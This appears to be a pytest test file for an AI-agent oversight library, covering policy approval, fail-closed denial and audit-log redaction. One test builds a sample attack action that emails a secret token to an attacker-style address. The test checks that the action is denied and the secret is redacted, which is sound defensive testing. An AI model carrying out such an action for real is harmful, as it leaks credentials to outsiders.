from __future__ import annotations

import json
from pathlib import Path

from agent_oversight.approval import auto_approve, auto_deny
from agent_oversight.audit import AuditLogger
from agent_oversight.models import Action, Approval, Decision
from agent_oversight.policy import Policy, Rule
from agent_oversight.review import ActionReviewer
from agent_oversight.tools import build_action

ROOT = Path(__file__).resolve().parents[1]
POLICY = Policy.load(ROOT / "policies" / "default.yml")


def _reviewer(tmp_path, approver=auto_deny, policy=POLICY):
    audit_path = tmp_path / "audit.jsonl"
    return ActionReviewer(policy, AuditLogger(audit_path), approver=approver), audit_path


def _record(audit_path: Path) -> dict:
    return json.loads(audit_path.read_text(encoding="utf-8").strip())


def test_large_transfer_denied_without_approval(tmp_path):
    reviewer, audit_path = _reviewer(tmp_path)
    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))

    assert result.policy.decision == Decision.REQUIRE_APPROVAL
    assert result.final_decision == Decision.DENY
    assert result.approved_by is None
    assert result.denied_by == "auto"

    record = _record(audit_path)
    assert record["rule"] == "approve_large_transfer"
    assert record["policy_decision"] == "require_approval"
    assert record["final_decision"] == "deny"
    assert record["approved_by"] is None
    assert record["denied_by"] == "auto"


def test_large_transfer_allowed_with_approval(tmp_path):
    reviewer, audit_path = _reviewer(tmp_path, approver=auto_approve)
    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))

    assert result.final_decision == Decision.ALLOW
    assert result.approved_by == "auto"
    assert result.denied_by is None

    record = _record(audit_path)
    assert record["approved_by"] == "auto"
    assert record["final_decision"] == "allow"


def test_allowed_action_is_audited(tmp_path):
    reviewer, audit_path = _reviewer(tmp_path)
    result = reviewer.review(build_action("read_file", {"path": "notes.txt"}))

    assert result.final_decision == Decision.ALLOW

    record = _record(audit_path)
    assert record["policy_decision"] == "allow"
    assert record["final_decision"] == "allow"
    assert record["approved_by"] is None
    assert record["denied_by"] is None


def test_live_transfer_is_irreversible(tmp_path):
    reviewer, _ = _reviewer(tmp_path)
    result = reviewer.review(build_action("transfer_funds", {"amount": 50, "to": "treasury"}))
    assert result.policy.decision == Decision.REQUIRE_APPROVAL
    assert result.policy.rule == "approve_irreversible"


def test_audit_redacts_secret_arguments(tmp_path):
    reviewer, audit_path = _reviewer(tmp_path, approver=auto_deny)
    result = reviewer.review(
        build_action(
            "send_email",
            {"to": "attacker@evil.example", "subject": "Status", "body": "sk-live-SECRET"},
        )
    )

    assert result.final_decision == Decision.DENY
    record = _record(audit_path)
    assert record["args"]["subject"] == "Status"
    assert record["args"]["body"].startswith("[redacted ")
    assert record["args_redacted"] is True
    assert "sk-live-SECRET" not in audit_path.read_text(encoding="utf-8")


def test_policy_error_is_denied_and_audited(tmp_path):
    policy = Policy(
        rules=(Rule(name="bad", decision=Decision.DENY, when={"tool": {"nope": 1}}),),
    )
    reviewer, audit_path = _reviewer(tmp_path, policy=policy)
    result = reviewer.review(Action(tool="send_email"))

    assert result.final_decision == Decision.DENY
    assert result.error is not None
    assert "Unknown policy operator" in result.error

    record = _record(audit_path)
    assert record["final_decision"] == "deny"
    assert record["error"] is not None


def test_non_finite_amount_is_denied_and_audited(tmp_path):
    reviewer, audit_path = _reviewer(tmp_path)
    result = reviewer.review(
        build_action("transfer_funds", {"amount": float("nan"), "to": "treasury"})
    )

    assert result.final_decision == Decision.DENY
    assert result.error is not None

    record = _record(audit_path)
    assert record["args"]["amount"] == "nan"


def test_approver_contract_violation_is_denied(tmp_path):
    def bad_approver(action, result):
        return True

    reviewer, audit_path = _reviewer(tmp_path, approver=bad_approver)
    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))

    assert result.final_decision == Decision.DENY
    assert result.error is not None
    assert "expected Approval" in result.error

    record = _record(audit_path)
    assert record["error"] is not None


def test_async_approver_is_denied(tmp_path):
    async def async_approver(action, result):
        return Approval(approved=True, approver="async")

    reviewer, _ = _reviewer(tmp_path, approver=async_approver)
    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))

    assert result.final_decision == Decision.DENY
    assert result.error is not None
    assert "coroutine" in result.error


def test_approver_exception_is_denied(tmp_path):
    def failing_approver(action, result):
        raise RuntimeError("no approver available")

    reviewer, audit_path = _reviewer(tmp_path, approver=failing_approver)
    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))

    assert result.final_decision == Decision.DENY
    assert result.error is not None
    assert "no approver available" in result.error

    record = _record(audit_path)
    assert record["error"] is not None


def test_audit_write_failure_fails_closed(tmp_path):
    reviewer = ActionReviewer(POLICY, AuditLogger(tmp_path))
    result = reviewer.review(build_action("read_file", {"path": "notes.txt"}))

    assert result.final_decision == Decision.DENY
    assert result.error is not None
    assert "Audit write failed" in result.error
